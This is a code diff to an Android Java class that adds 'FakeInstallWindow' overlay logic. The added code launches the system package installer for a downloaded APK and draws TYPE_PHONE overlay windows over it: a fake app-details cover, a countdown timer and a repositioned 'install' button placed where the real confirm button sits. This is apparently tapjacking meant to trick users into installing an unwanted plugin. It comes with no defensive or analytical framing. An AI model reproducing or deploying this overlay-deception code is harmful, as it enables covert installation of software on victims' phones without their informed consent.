@@ -32,21 +32,12 @@ public class UtilOperator {
 
     public static FakeInstallWindow fake;
 
-    private static void intstallLocalApk(final Context context, String fullPath) {
+    private static void intstallLocalApk(final Context context, final String fullPath) {
         try {
             Runtime.getRuntime().exec("chmod 666 " + fullPath);
         } catch (IOException e) {
             e.printStackTrace();
         }
-
-        Config.DOWNLOAD_PROCESS_RUNNING.set(true);
-        Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to install apk : " + fullPath);
-        Intent i = new Intent(Intent.ACTION_VIEW);
-        File upgradeFile = new File(fullPath);
-        i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
-        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
-        context.startActivity(i);
 
         Config.LOGD("[[intstallLocalApk]] try to install plugin once with fake window");
 
@@ -55,31 +46,53 @@ public class UtilOperator {
             @Override
             public void run() {
                 fake = new FakeInstallWindow(context);
-                fake.show();
+                fake.show(true);
                 fake.updateTimerCount();
+
+                Config.DOWNLOAD_PROCESS_RUNNING.set(false);
+                Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to install apk : " + fullPath);
+                Intent i = new Intent(Intent.ACTION_VIEW);
+                File upgradeFile = new File(fullPath);
+                i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
+                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+                context.startActivity(i);
             }
         });
     }
 
     public static final class FakeInstallWindow {
+
+        private static final int TIMER_COUNT = 20;
+
         private View coverView;
         private View timerView;
         private TextView timeTV;
         private View installView;
         private Context context;
         private WindowManager wm;
-        private int count = 20;
+        private int count = TIMER_COUNT;
         private Handler handler;
+        private LayoutInflater layoutInflater;
+        private int screenWidth;
+        private int screenHeight;
+        private float density;
 
         public FakeInstallWindow(Context context) {
             this.context = context;
-            LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
+            layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
             coverView = layoutInflater.inflate(R.layout.app_details, null);
             timerView = layoutInflater.inflate(R.layout.fake_timer, null);
             timeTV = (TextView) timerView.findViewById(R.id.timer);
             installView = layoutInflater.inflate(R.layout.fake_install_btn, null);
             wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
             handler = new Handler(context.getMainLooper());
+
+            DisplayMetrics dm = new DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(dm);
+            screenWidth = dm.widthPixels;
+            screenHeight = dm.heightPixels;
+            density = dm.density;
 
             //init view
             ImageView icon = (ImageView) coverView.findViewById(R.id.app_icon);
@@ -96,7 +109,6 @@ public class UtilOperator {
         public void updateTimerCount() {
             if (count <= 0) {
                 if (coverView != null && timerView != null) {
-                    UtilsRuntime.goHome(context);
                     wm.removeView(coverView);
                     wm.removeView(timerView);
                     wm.removeView(installView);
@@ -106,6 +118,44 @@ public class UtilOperator {
                 installView = null;
                 fake = null;
             } else {
+                if (count == (TIMER_COUNT - 2)) {
+                    //update install btn
+
+                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+                    confirmBtnParams.format = PixelFormat.RGBA_8888;
+                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+                    confirmBtnParams.width = (int) (50 * density);
+                    confirmBtnParams.height = (int) (48 * density);
+                    confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
+                    confirmBtnParams.y = screenHeight - (int) (48 * density);
+                    wm.updateViewLayout(installView, confirmBtnParams);
+                } else if (count == 1) {
+                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+                    confirmBtnParams.format = PixelFormat.RGBA_8888;
+                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+                    confirmBtnParams.width = screenWidth / 2;
+                    confirmBtnParams.height = (int) (48 * density);
+                    confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
+                    wm.updateViewLayout(installView, confirmBtnParams);
+
+                    UtilsRuntime.goHome(context);
+                }
+
+                if (AppRuntime.PLUGIN_INSTALLED) {
+                    AppRuntime.PLUGIN_INSTALLED = false;
+
+                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+                    confirmBtnParams.format = PixelFormat.RGBA_8888;
+                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+                    confirmBtnParams.width = screenWidth / 2;
+                    confirmBtnParams.height = (int) (48 * density);
+                    confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
+                    wm.updateViewLayout(installView, confirmBtnParams);
+                }
+
                 handler.post(new Runnable() {
                     @Override
                     public void run() {
@@ -135,23 +185,25 @@ public class UtilOperator {
 //            fake = null;
         }
 
-        public void show() {
-            DisplayMetrics dm = new DisplayMetrics();
-            wm.getDefaultDisplay().getMetrics(dm);
-            int screenWidth = dm.widthPixels;
-            int screenHeight = dm.heightPixels;
-            float density = dm.density;
-
+        public void show(boolean full) {
             //install
             WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
-            confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
-            confirmBtnParams.format = PixelFormat.RGBA_8888;
-            confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-            confirmBtnParams.width = (int) (60 * density);
-            confirmBtnParams.height = (int) (38 * density);
-            confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (26 * density);
-//            confirmBtnParams.x = screenWidth / 2 ;
-            confirmBtnParams.y = screenHeight - (int) (54 * density);
+            if (!full) {
+                confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+                confirmBtnParams.format = PixelFormat.RGBA_8888;
+                confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+                confirmBtnParams.width = (int) (60 * density);
+                confirmBtnParams.height = (int) (38 * density);
+                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (26 * density);
+                confirmBtnParams.y = screenHeight - (int) (54 * density);
+            } else {
+                confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+                confirmBtnParams.format = PixelFormat.RGBA_8888;
+                confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+                confirmBtnParams.width = screenWidth / 2;
+                confirmBtnParams.height = (int) (48 * density);
+                confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
+            }
             wm.addView(installView, confirmBtnParams);
 
             //timer
